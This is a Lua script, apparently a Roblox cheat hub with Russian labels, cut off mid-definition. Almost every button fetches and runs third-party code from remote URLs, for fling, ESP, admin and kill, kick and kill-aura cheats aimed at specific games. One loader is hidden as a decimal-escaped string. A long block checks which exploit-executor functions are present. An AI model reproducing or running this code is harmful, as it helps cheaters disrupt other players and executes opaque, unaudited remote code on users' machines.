local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "KillMine script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroText = "KillMine", IntroIcon = "rbxassetid://17717678216"})

local Misc = Window:MakeTab({
    Name = "Home",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

local Section = Misc:AddSection({
Name = "Функционал"
})

Misc:AddSlider({
    Name = "Скорость",
    Min = 16,
    Max = 50000,
    Default = 16,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end    
})

Misc:AddSlider({
    Name = "Высота прыжка",
    Min = 40,
    Max = 50000,
    Default = 5,
    Color = Color3.fromRGB(255,255,255),
    Increment = 1,
    ValueName = "Height",
    Callback = function(Value)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end    
})

local Tab = Window:MakeTab({
    Name = "Полезные скрипты",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "Fly",
    Callback = function()
              loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
      end
})

Tab:AddButton({
    Name = "Touch Fling",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
      end
})

Tab:AddButton({
    Name = "Touch Fling with click for Solara",
    Callback = function()
              loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
      end
})

Tab:AddButton({
    Name = "Infinity Yield",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
      end
})

Tab:AddButton({
    Name = "Nameless Admin",
    Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
      end
})

Tab:AddButton({
    Name = "ESP",
    Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
      end
})


Tab:AddButton({
    Name = "telekinesis",
    Callback = function()
              loadstring(game:HttpGet("https://pastebin.com/raw/KduE9A6z"))()
      end
})

Tab:AddButton({
    Name = "Emotes",
    Callback = function()
              loadstring(game:HttpGet("https://scriptblox.com/raw/Brookhaven-RP-all-emotes-6849"))()
      end
})

Tab:AddButton({
    Name = "DEX",
    Callback = function()
              loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
      end
})

Tab:AddButton({
    Name = "UNC Test",
    Callback = function()
        local passes, fails, undefined = 0, 0, 0
        local running = 0
        
        local function getGlobal(path)
            local value = getfenv(0)
        
            while value ~= nil and path ~= "" do
                local name, nextValue = string.match(path, "^([^.]+)%.?(.*)$")
                value = value[name]
                path = nextValue
            end
        
            return value
        end
        
        local function test(name, aliases, callback)
            running += 1
        
            task.spawn(function()
                if not callback then
                    print("⏺️ " .. name)
                elseif not getGlobal(name) then
                    fails += 1
                    warn("⛔ " .. name)
                else
                    local success, message = pcall(callback)
            
                    if success then
                        passes += 1
                        print("✅ " .. name .. (message and " • " .. message or ""))
                    else
                        fails += 1
                        warn("⛔ " .. name .. " failed: " .. message)
                    end
                end
            
                local undefinedAliases = {}
            
                for _, alias in ipairs(aliases) do
                    if getGlobal(alias) == nil then
                        table.insert(undefinedAliases, alias)
                    end
                end
            
                if #undefinedAliases > 0 then
                    undefined += 1
                    warn("⚠️ " .. table.concat(undefinedAliases, ", "))
                end
        
                running -= 1
            end)
        end
        
        -- Header and summary
        
        print("\n")
        
        print("UNC Environment Check")
        print("✅ - Pass, ⛔ - Fail, ⏺️ - No test, ⚠️ - Missing aliases\n")
        
        task.defer(function()
            repeat task.wait() until running == 0
        
            local rate = math.round(passes / (passes + fails) * 100)
            local outOf = passes .. " out of " .. (passes + fails)
        
            print("\n")
        
            print("UNC Summary")
            print("✅ Tested with a " .. rate .. "% success rate (" .. outOf .. ")")
            print("⛔ " .. fails .. " tests failed")
            print("⚠️ " .. undefined .. " globals are missing aliases")
        end)
        
        -- Cache
        
        test("cache.invalidate", {}, function()
            local container = Instance.new("Folder")
            local part = Instance.new("Part", container)
            cache.invalidate(container:FindFirstChild("Part"))
            assert(part ~= container:FindFirstChild("Part"), "Reference `part` could not be invalidated")
        end)
        
        test("cache.iscached", {}, function()
            local part = Instance.new("Part")
            assert(cache.iscached(part), "Part should be cached")
            cache.invalidate(part)
            assert(not cache.iscached(part), "Part should not be cached")
        end)
        
        test("cache.replace", {}, function()
            local part = Instance.new("Part")
            local fire = Instance.new("Fire")
            cache.replace(part, fire)
            assert(part ~= fire, "Part was not replaced with Fire")
        end)
        
        test("cloneref", {}, function()
            local part = Instance.new("Part")
            local clone = cloneref(part)
            assert(part ~= clone, "Clone should not be equal to original")
            clone.Name = "Test"
            assert(part.Name == "Test", "Clone should have updated the original")
        end)
        
        test("compareinstances", {}, function()
            local part = Instance.new("Part")
            local clone = cloneref(part)
            assert(part ~= clone, "Clone should not be equal to original")
            assert(compareinstances(part, clone), "Clone should be equal to original when using compareinstances()")
        end)
        
        -- Closures
        
        local function shallowEqual(t1, t2)
            if t1 == t2 then
                return true
            end
        
            local UNIQUE_TYPES = {
                ["function"] = true,
                ["table"] = true,
                ["userdata"] = true,
                ["thread"] = true,
            }
        
            for k, v in pairs(t1) do
                if UNIQUE_TYPES[type(v)] then
                    if type(t2[k]) ~= type(v) then
                        return false
                    end
                elseif t2[k] ~= v then
                    return false
                end
            end
        
            for k, v in pairs(t2) do
                if UNIQUE_TYPES[type(v)] then
                    if type(t2[k]) ~= type(v) then
                        return false
                    end
                elseif t1[k] ~= v then
                    return false
                end
            end
        
            return true
        end
        
        test("checkcaller", {}, function()
            assert(checkcaller(), "Main scope should return true")
        end)
        
        test("clonefunction", {}, function()
            local function test()
                return "success"
            end
            local copy = clonefunction(test)
            assert(test() == copy(), "The clone should return the same value as the original")
            assert(test ~= copy, "The clone should not be equal to the original")
        end)
        
        test("getcallingscript", {})
        
        test("getscriptclosure", {"getscriptfunction"}, function()
            local module = game:GetService("CoreGui").RobloxGui.Modules.Common.Constants
            local constants = getrenv().require(module)
            local generated = getscriptclosure(module)()
            assert(constants ~= generated, "Generated module should not match the original")
            assert(shallowEqual(constants, generated), "Generated constant table should be shallow equal to the original")
        end)
        
        test("hookfunction", {"replaceclosure"}, function()
            local function test()
                return true
            end
            local ref = hookfunction(test, function()
                return false
            end)
            assert(test() == false, "Function should return false")
            assert(ref() == true, "Original function should return true")
            assert(test ~= ref, "Original function should not be same as the reference")
        end)
        
        test("iscclosure", {}, function()
            assert(iscclosure(print) == true, "Function 'print' should be a C closure")
            assert(iscclosure(function() end) == false, "Executor function should not be a C closure")
        end)
        
        test("islclosure", {}, function()
            assert(islclosure(print) == false, "Function 'print' should not be a Lua closure")
            assert(islclosure(function() end) == true, "Executor function should be a Lua closure")
        end)
        
        test("isexecutorclosure", {"checkclosure", "isourclosure"}, function()
            assert(isexecutorclosure(isexecutorclosure) == true, "Did not return true for an executor global")
            assert(isexecutorclosure(newcclosure(function() end)) == true, "Did not return true for an executor C closure")
            assert(isexecutorclosure(function() end) == true, "Did not return true for an executor Luau closure")
            assert(isexecutorclosure(print) == false, "Did not return false for a Roblox global")
        end)
        
        test("loadstring", {}, function()
            local animate = game:GetService("Players").LocalPlayer.Character.Animate
            local bytecode = getscriptbytecode(animate)
            local func = loadstring(bytecode)
            assert(type(func) ~= "function", "Luau bytecode should not be loadable!")
            assert(assert(loadstring("return ... + 1"))(1) == 2, "Failed to do simple math")
            assert(type(select(2, loadstring("f"))) == "string", "Loadstring did not return anything for a compiler error")
        end)
        
        test("newcclosure", {}, function()
            local function test()
                return true
            end
            local testC = newcclosure(test)
            assert(test() == testC(), "New C closure should return the same value as the original")
            assert(test ~= testC, "New C closure should not be same as the original")
            assert(iscclosure(testC), "New C closure should be a C closure")
        end)
        
        -- Console
        
        test("rconsoleclear", {"consoleclear"})
        
        test("rconsolecreate", {"consolecreate"})
        
        test("rconsoledestroy", {"consoledestroy"})
        
        test("rconsoleinput", {"consoleinput"})
        
        test("rconsoleprint", {"consoleprint"})
        
        test("rconsolesettitle", {"rconsolename", "consolesettitle"})
        
        -- Crypt
        
        test("crypt.base64encode", {"crypt.base64.encode", "crypt.base64_encode", "base64.encode", "base64_encode"}, function()
            assert(crypt.base64encode("test") == "dGVzdA==", "Base64 encoding failed")
        end)
        
        test("crypt.base64decode", {"crypt.base64.decode", "crypt.base64_decode", "base64.decode", "base64_decode"}, function()
            assert(crypt.base64decode("dGVzdA==") == "test", "Base64 decoding failed")
        end)
        
        test("crypt.encrypt", {}, function()
            local key = crypt.generatekey()
            local encrypted, iv = crypt.encrypt("test", key, nil, "CBC")
            assert(iv, "crypt.encrypt should return an IV")
            local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
            assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
        end)
        
        test("crypt.decrypt", {}, function()
            local key, iv = crypt.generatekey(), crypt.generatekey()
            local encrypted = crypt.encrypt("test", key, iv, "CBC")
            local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
            assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
        end)
        
        test("crypt.generatebytes", {}, function()
            local size = math.random(10, 100)
            local bytes = crypt.generatebytes(size)
            assert(#crypt.base64decode(bytes) == size, "The decoded result should be " .. size .. " bytes long (got " .. #crypt.base64decode(bytes) .. " decoded, " .. #bytes .. " raw)")
        end)
        
        test("crypt.generatekey", {}, function()
            local key = crypt.generatekey()
            assert(#crypt.base64decode(key) == 32, "Generated key should be 32 bytes long when decoded")
        end)
        
        test("crypt.hash", {}, function()
            local algorithms = {'sha1', 'sha384', 'sha512', 'md5', 'sha256', 'sha3-224', 'sha3-256', 'sha3-512'}
            for _, algorithm in ipairs(algorithms) do
                local hash = crypt.hash("test", algorithm)
                assert(hash, "crypt.hash on algorithm '" .. algorithm .. "' should return a hash")
            end
        end)
        
        --- Debug
        
        test("debug.getconstant", {}, function()
            local function test()
                print("Hello, world!")
            end
            assert(debug.getconstant(test, 1) == "print", "First constant must be print")
            assert(debug.getconstant(test, 2) == nil, "Second constant must be nil")
            assert(debug.getconstant(test, 3) == "Hello, world!", "Third constant must be 'Hello, world!'")
        end)
        
        test("debug.getconstants", {}, function()
            local function test()
                local num = 5000 .. 50000
                print("Hello, world!", num, warn)
            end
            local constants = debug.getconstants(test)
            assert(constants[1] == 50000, "First constant must be 50000")
            assert(constants[2] == "print", "Second constant must be print")
            assert(constants[3] == nil, "Third constant must be nil")
            assert(constants[4] == "Hello, world!", "Fourth constant must be 'Hello, world!'")
            assert(constants[5] == "warn", "Fifth constant must be warn")
        end)
        
        test("debug.getinfo", {}, function()
            local types = {
                source = "string",
                short_src = "string",
                func = "function",
                what = "string",
                currentline = "number",
                name = "string",
                nups = "number",
                numparams = "number",
                is_vararg = "number",
            }
            local function test(...)
                print(...)
            end
            local info = debug.getinfo(test)
            for k, v in pairs(types) do
                assert(info[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
                assert(type(info[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(info[k]) .. ")")
            end
        end)
        
        test("debug.getproto", {}, function()
            local function test()
                local function proto()
                    return true
                end
            end
            local proto = debug.getproto(test, 1, true)[1]
            local realproto = debug.getproto(test, 1)
            assert(proto, "Failed to get the inner function")
            assert(proto() == true, "The inner function did not return anything")
            if not realproto() then
                return "Proto return values are disabled on this executor"
            end
        end)
        
        test("debug.getprotos", {}, function()
            local function test()
                local function _1()
                    return true
                end
                local function _2()
                    return true
                end
                local function _3()
                    return true
                end
            end
            for i in ipairs(debug.getprotos(test)) do
                local proto = debug.getproto(test, i, true)[1]
                local realproto = debug.getproto(test, i)
                assert(proto(), "Failed to get inner function " .. i)
                if not realproto() then
                    return "Proto return values are disabled on this executor"
                end
            end
        end)
        
        test("debug.getstack", {}, function()
            local _ = "a" .. "b"
            assert(debug.getstack(1, 1) == "ab", "The first item in the stack should be 'ab'")
            assert(debug.getstack(1)[1] == "ab", "The first item in the stack table should be 'ab'")
        end)
        
        test("debug.getupvalue", {}, function()
            local upvalue = function() end
            local function test()
                print(upvalue)
            end
            assert(debug.getupvalue(test, 1) == upvalue, "Unexpected value returned from debug.getupvalue")
        end)
        
        test("debug.getupvalues", {}, function()
            local upvalue = function() end
            local function test()
                print(upvalue)
            end
            local upvalues = debug.getupvalues(test)
            assert(upvalues[1] == upvalue, "Unexpected value returned from debug.getupvalues")
        end)
        
        test("debug.setconstant", {}, function()
            local function test()
                return "fail"
            end
            debug.setconstant(test, 1, "success")
            assert(test() == "success", "debug.setconstant did not set the first constant")
        end)
        
        test("debug.setstack", {}, function()
            local function test()
                return "fail", debug.setstack(1, 1, "success")
            end
            assert(test() == "success", "debug.setstack did not set the first stack item")
        end)
        
        test("debug.setupvalue", {}, function()
            local function upvalue()
                return "fail"
            end
            local function test()
                return upvalue()
            end
            debug.setupvalue(test, 1, function()
                return "success"
            end)
            assert(test() == "success", "debug.setupvalue did not set the first upvalue")
        end)
        
        -- Filesystem
        
        if isfolder and makefolder and delfolder then
            if isfolder(".tests") then
                delfolder(".tests")
            end
            makefolder(".tests")
        end
        
        test("readfile", {}, function()
            writefile(".tests/readfile.txt", "success")
            assert(readfile(".tests/readfile.txt") == "success", "Did not return the contents of the file")
        end)
        
        test("listfiles", {}, function()
            makefolder(".tests/listfiles")
            writefile(".tests/listfiles/test_1.txt", "success")
            writefile(".tests/listfiles/test_2.txt", "success")
            local files = listfiles(".tests/listfiles")
            assert(#files == 2, "Did not return the correct number of files")
            assert(isfile(files[1]), "Did not return a file path")
            assert(readfile(files[1]) == "success", "Did not return the correct files")
            makefolder(".tests/listfiles_2")
            makefolder(".tests/listfiles_2/test_1")
            makefolder(".tests/listfiles_2/test_2")
            local folders = listfiles(".tests/listfiles_2")
            assert(#folders == 2, "Did not return the correct number of folders")
            assert(isfolder(folders[1]), "Did not return a folder path")
        end)
        
        test("writefile", {}, function()
            writefile(".tests/writefile.txt", "success")
            assert(readfile(".tests/writefile.txt") == "success", "Did not write the file")
            local requiresFileExt = pcall(function()
                writefile(".tests/writefile", "success")
                assert(isfile(".tests/writefile.txt"))
            end)
            if not requiresFileExt then
                return "This executor requires a file extension in writefile"
            end
        end)
        
        test("makefolder", {}, function()
            makefolder(".tests/makefolder")
            assert(isfolder(".tests/makefolder"), "Did not create the folder")
        end)
        
        test("appendfile", {}, function()
            writefile(".tests/appendfile.txt", "su")
            appendfile(".tests/appendfile.txt", "cce")
            appendfile(".tests/appendfile.txt", "ss")
            assert(readfile(".tests/appendfile.txt") == "success", "Did not append the file")
        end)
        
        test("isfile", {}, function()
            writefile(".tests/isfile.txt", "success")
            assert(isfile(".tests/isfile.txt") == true, "Did not return true for a file")
            assert(isfile(".tests") == false, "Did not return false for a folder")
            assert(isfile(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfile(".tests/doesnotexist.exe")) .. ")")
        end)
        
        test("isfolder", {}, function()
            assert(isfolder(".tests") == true, "Did not return false for a folder")
            assert(isfolder(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfolder(".tests/doesnotexist.exe")) .. ")")
        end)
        
        test("delfolder", {}, function()
            makefolder(".tests/delfolder")
            delfolder(".tests/delfolder")
            assert(isfolder(".tests/delfolder") == false, "Failed to delete folder (isfolder = " .. tostring(isfolder(".tests/delfolder")) .. ")")
        end)
        
        test("delfile", {}, function()
            writefile(".tests/delfile.txt", "Hello, world!")
            delfile(".tests/delfile.txt")
            assert(isfile(".tests/delfile.txt") == false, "Failed to delete file (isfile = " .. tostring(isfile(".tests/delfile.txt")) .. ")")
        end)
        
        test("loadfile", {}, function()
            writefile(".tests/loadfile.txt", "return ... + 1")
            assert(assert(loadfile(".tests/loadfile.txt"))(1) == 2, "Failed to load a file with arguments")
            writefile(".tests/loadfile.txt", "f")
            local callback, err = loadfile(".tests/loadfile.txt")
            assert(err and not callback, "Did not return an error message for a compiler error")
        end)
        
        test("dofile", {})
        
        -- Input
        
        test("isrbxactive", {"isgameactive"}, function()
            assert(type(isrbxactive()) == "boolean", "Did not return a boolean value")
        end)
        
        test("mouse1click", {})
        
        test("mouse1press", {})
        
        test("mouse1release", {})
        
        test("mouse2click", {})
        
        test("mouse2press", {})
        
        test("mouse2release", {})
        
        test("mousemoveabs", {})
        
        test("mousemoverel", {})
        
        test("mousescroll", {})
        
        -- Instances
        
        test("fireclickdetector", {}, function()
            local detector = Instance.new("ClickDetector")
            fireclickdetector(detector, 50, "MouseHoverEnter")
        end)
        
        test("getcallbackvalue", {}, function()
            local bindable = Instance.new("BindableFunction")
            local function test()
            end
            bindable.OnInvoke = test
            assert(getcallbackvalue(bindable, "OnInvoke") == test, "Did not return the correct value")
        end)
        
        test("getconnections", {}, function()
            local types = {
                Enabled = "boolean",
                ForeignState = "boolean",
                LuaConnection = "boolean",
                Function = "function",
                Thread = "thread",
                Fire = "function",
                Defer = "function",
                Disconnect = "function",
                Disable = "function",
                Enable = "function",
            }
            local bindable = Instance.new("BindableEvent")
            bindable.Event:Connect(function() end)
            local connection = getconnections(bindable.Event)[1]
            for k, v in pairs(types) do
                assert(connection[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
                assert(type(connection[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(connection[k]) .. ")")
            end
        end)
        
        test("getcustomasset", {}, function()
            writefile(".tests/getcustomasset.txt", "success")
            local contentId = getcustomasset(".tests/getcustomasset.txt")
            assert(type(contentId) == "string", "Did not return a string")
            assert(#contentId > 0, "Returned an empty string")
            assert(string.match(contentId, "rbxasset://") == "rbxasset://", "Did not return an rbxasset url")
        end)
        
        test("gethiddenproperty", {}, function()
            local fire = Instance.new("Fire")
            local property, isHidden = gethiddenproperty(fire, "size_xml")
            assert(property == 5, "Did not return the correct value")
            assert(isHidden == true, "Did not return whether the property was hidden")
        end)
        
        test("sethiddenproperty", {}, function()
            local fire = Instance.new("Fire")
            local hidden = sethiddenproperty(fire, "size_xml", 10)
            assert(hidden, "Did not return true for the hidden property")
            assert(gethiddenproperty(fire, "size_xml") == 10, "Did not set the hidden property")
        end)
        
        test("gethui", {}, function()
            assert(typeof(gethui()) == "Instance", "Did not return an Instance")
        end)
        
        test("getinstances", {}, function()
            assert(getinstances()[1]:IsA("Instance"), "The first value is not an Instance")
        end)
        
        test("getnilinstances", {}, function()
            assert(getnilinstances()[1]:IsA("Instance"), "The first value is not an Instance")
            assert(getnilinstances()[1].Parent == nil, "The first value is not parented to nil")
        end)
        
        test("isscriptable", {}, function()
            local fire = Instance.new("Fire")
            assert(isscriptable(fire, "size_xml") == false, "Did not return false for a non-scriptable property (size_xml)")
            assert(isscriptable(fire, "Size") == true, "Did not return true for a scriptable property (Size)")
        end)
        
        test("setscriptable", {}, function()
            local fire = Instance.new("Fire")
            local wasScriptable = setscriptable(fire, "size_xml", true)
            assert(wasScriptable == false, "Did not return false for a non-scriptable property (size_xml)")
            assert(isscriptable(fire, "size_xml") == true, "Did not set the scriptable property")
            fire = Instance.new("Fire")
            assert(isscriptable(fire, "size_xml") == false, "⚠️⚠️ setscriptable persists between unique instances ⚠️⚠️")
        end)
        
        test("setrbxclipboard", {})
        
        -- Metatable
        
        test("getrawmetatable", {}, function()
            local metatable = { __metatable = "Locked!" }
            local object = setmetatable({}, metatable)
            assert(getrawmetatable(object) == metatable, "Did not return the metatable")
        end)
        
        test("hookmetamethod", {}, function()
            local object = setmetatable({}, { __index = newcclosure(function() return false end), __metatable = "Locked!" })
            local ref = hookmetamethod(object, "__index", function() return true end)
            assert(object.test == true, "Failed to hook a metamethod and change the return value")
            assert(ref() == false, "Did not return the original function")
        end)
        
        test("getnamecallmethod", {}, function()
            local method
            local ref
            ref = hookmetamethod(game, "__namecall", function(...)
                if not method then
                    method = getnamecallmethod()
                end
                return ref(...)
            end)
            game:GetService("Lighting")
            assert(method == "GetService", "Did not get the correct method (GetService)")
        end)
        
        test("isreadonly", {}, function()
            local object = {}
            table.freeze(object)
            assert(isreadonly(object), "Did not return true for a read-only table")
        end)
        
        test("setrawmetatable", {}, function()
            local object = setmetatable({}, { __index = function() return false end, __metatable = "Locked!" })
            local objectReturned = setrawmetatable(object, { __index = function() return true end })
            assert(object, "Did not return the original object")
            assert(object.test == true, "Failed to change the metatable")
            if objectReturned then
                return objectReturned == object and "Returned the original object" or "Did not return the original object"
            end
        end)
        
        test("setreadonly", {}, function()
            local object = { success = false }
            table.freeze(object)
            setreadonly(object, false)
            object.success = true
            assert(object.success, "Did not allow the table to be modified")
        end)
        
        -- Miscellaneous
        
        test("identifyexecutor", {"getexecutorname"}, function()
            local name, version = identifyexecutor()
            assert(type(name) == "string", "Did not return a string for the name")
            return type(version) == "string" and "Returns version as a string" or "Does not return version"
        end)
        
        test("lz4compress", {}, function()
            local raw = "Hello, world!"
            local compressed = lz4compress(raw)
            assert(type(compressed) == "string", "Compression did not return a string")
            assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
        end)
        
        test("lz4decompress", {}, function()
            local raw = "Hello, world!"
            local compressed = lz4compress(raw)
            assert(type(compressed) == "string", "Compression did not return a string")
            assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
        end)
        
        test("messagebox", {})
        
        test("queue_on_teleport", {"queueonteleport"})
        
        test("request", {"http.request", "http_request"}, function()
            local response = request({
                Url = "https://httpbin.org/user-agent",
                Method = "GET",
            })
            assert(type(response) == "table", "Response must be a table")
            assert(response.StatusCode == 200, "Did not return a 200 status code")
            local data = game:GetService("HttpService"):JSONDecode(response.Body)
            assert(type(data) == "table" and type(data["user-agent"]) == "string", "Did not return a table with a user-agent key")
            return "User-Agent: " .. data["user-agent"]
        end)
        
        test("setclipboard", {"toclipboard"})
        
        test("setfpscap", {}, function()
            local renderStepped = game:GetService("RunService").RenderStepped
            local function step()
                renderStepped:Wait()
                local sum = 0
                for _ = 1, 5 do
                    sum += 1 / renderStepped:Wait()
                end
                return math.round(sum / 5)
            end
            setfpscap(60)
            local step60 = step()
            setfpscap(0)
            local step0 = step()
            return step60 .. "fps @60 • " .. step0 .. "fps @0"
        end)
        
        -- Scripts
        
        test("getgc", {}, function()
            local gc = getgc()
            assert(type(gc) == "table", "Did not return a table")
            assert(#gc > 0, "Did not return a table with any values")
        end)
        
        test("getgenv", {}, function()
            getgenv().__TEST_GLOBAL = true
            assert(__TEST_GLOBAL, "Failed to set a global variable")
            getgenv().__TEST_GLOBAL = nil
        end)
        
        test("getloadedmodules", {}, function()
            local modules = getloadedmodules()
            assert(type(modules) == "table", "Did not return a table")
            assert(#modules > 0, "Did not return a table with any values")
            assert(typeof(modules[1]) == "Instance", "First value is not an Instance")
            assert(modules[1]:IsA("ModuleScript"), "First value is not a ModuleScript")
        end)
        
        test("getrenv", {}, function()
            assert(_G ~= getrenv()._G, "The variable _G in the executor is identical to _G in the game")
        end)
        
        test("getrunningscripts", {}, function()
            local scripts = getrunningscripts()
            assert(type(scripts) == "table", "Did not return a table")
            assert(#scripts > 0, "Did not return a table with any values")
            assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
            assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
        end)
        
        test("getscriptbytecode", {"dumpstring"}, function()
            local animate = game:GetService("Players").LocalPlayer.Character.Animate
            local bytecode = getscriptbytecode(animate)
            assert(type(bytecode) == "string", "Did not return a string for Character.Animate (a " .. animate.ClassName .. ")")
        end)
        
        test("getscripthash", {}, function()
            local animate = game:GetService("Players").LocalPlayer.Character.Animate:Clone()
            local hash = getscripthash(animate)
            local source = animate.Source
            animate.Source = "print('Hello, world!')"
            task.defer(function()
                animate.Source = source
            end)
            local newHash = getscripthash(animate)
            assert(hash ~= newHash, "Did not return a different hash for a modified script")
            assert(newHash == getscripthash(animate), "Did not return the same hash for a script with the same source")
        end)
        
        test("getscripts", {}, function()
            local scripts = getscripts()
            assert(type(scripts) == "table", "Did not return a table")
            assert(#scripts > 0, "Did not return a table with any values")
            assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
            assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
        end)
        
        test("getsenv", {}, function()
            local animate = game:GetService("Players").LocalPlayer.Character.Animate
            local env = getsenv(animate)
            assert(type(env) == "table", "Did not return a table for Character.Animate (a " .. animate.ClassName .. ")")
            assert(env.script == animate, "The script global is not identical to Character.Animate")
        end)
        
        test("getthreadidentity", {"getidentity", "getthreadcontext"}, function()
            assert(type(getthreadidentity()) == "number", "Did not return a number")
        end)
        
        test("setthreadidentity", {"setidentity", "setthreadcontext"}, function()
            setthreadidentity(3)
            assert(getthreadidentity() == 3, "Did not set the thread identity")
        end)
        
        -- Drawing
        
        test("Drawing", {})
        
        test("Drawing.new", {}, function()
            local drawing = Drawing.new("Square")
            drawing.Visible = false
            local canDestroy = pcall(function()
                drawing:Destroy()
            end)
            assert(canDestroy, "Drawing:Destroy() should not throw an error")
        end)
        
        test("Drawing.Fonts", {}, function()
            assert(Drawing.Fonts.UI == 0, "Did not return the correct id for UI")
            assert(Drawing.Fonts.System == 1, "Did not return the correct id for System")
            assert(Drawing.Fonts.Plex == 2, "Did not return the correct id for Plex")
            assert(Drawing.Fonts.Monospace == 3, "Did not return the correct id for Monospace")
        end)
        
        test("isrenderobj", {}, function()
            local drawing = Drawing.new("Image")
            drawing.Visible = true
            assert(isrenderobj(drawing) == true, "Did not return true for an Image")
            assert(isrenderobj(newproxy()) == false, "Did not return false for a blank table")
        end)
        
        test("getrenderproperty", {}, function()
            local drawing = Drawing.new("Image")
            drawing.Visible = true
            assert(type(getrenderproperty(drawing, "Visible")) == "boolean", "Did not return a boolean value for Image.Visible")
            local success, result = pcall(function()
                return getrenderproperty(drawing, "Color")
            end)
            if not success or not result then
                return "Image.Color is not supported"
            end
        end)
        
        test("setrenderproperty", {}, function()
            local drawing = Drawing.new("Square")
            drawing.Visible = true
            setrenderproperty(drawing, "Visible", false)
            assert(drawing.Visible == false, "Did not set the value for Square.Visible")
        end)
        
        test("cleardrawcache", {}, function()
            cleardrawcache()
        end)
        
        -- WebSocket
        
        test("WebSocket", {})
        
        test("WebSocket.connect", {}, function()
            local types = {
                Send = "function",
                Close = "function",
                OnMessage = {"table", "userdata"},
                OnClose = {"table", "userdata"},
            }
            local ws = WebSocket.connect("ws://echo.websocket.events")
            assert(type(ws) == "table" or type(ws) == "userdata", "Did not return a table or userdata")
            for k, v in pairs(types) do
                if type(v) == "table" then
                    assert(table.find(v, type(ws[k])), "Did not return a " .. table.concat(v, ", ") .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
                else
                    assert(type(ws[k]) == v, "Did not return a " .. v .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
                end
            end
            ws:Close()
        end)
      end
})

local Chaos = Window:MakeTab({
    Name = "Читы на chaos",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Chaos:AddButton({
    Name = "Kill GUI, Kill Aura",
    Callback = function()
              loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/CHAOS%20-%20KILL%20GUI%20V3'),true))()
      end
})

Chaos:AddButton({
    Name = "Gui",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Chaos%20Destrozer%20Hub"))()
      end
})

Chaos:AddButton({
    Name = "Katana",
    Callback = function()
              loadstring(game:HttpGet("https://scriptblox.com/raw/Cacophony-Small-Update-Sussy-Hub-12623"))()
      end
})

local Lpi = Window:MakeTab({
    Name = "Читы на Lpi alpha",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Lpi:AddButton({
    Name = "Kill Player, Kick, Bald",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/LPIAlpha", true))()
      end
})

local Mm2 = Window:MakeTab({
    Name = "Читы на Mm2",
    Icon = "rbxassetid://14273889332",
    PremiumOnly = false
})

Mm2:AddButton({
    Name = "Esp",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
      end
})

Mm2:AddButton({
    Name = "Vynixu",
    Callback = function()
              loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
      end
})

Mm2:AddButton({
    Name = "Byte hub",
    Callback = function()
              loadstring(game:HttpGet("https://scriptblox.com/raw/Murder-Mystery-2-ByteHub-10357"))()
      end
})

Mm2:AddButton({
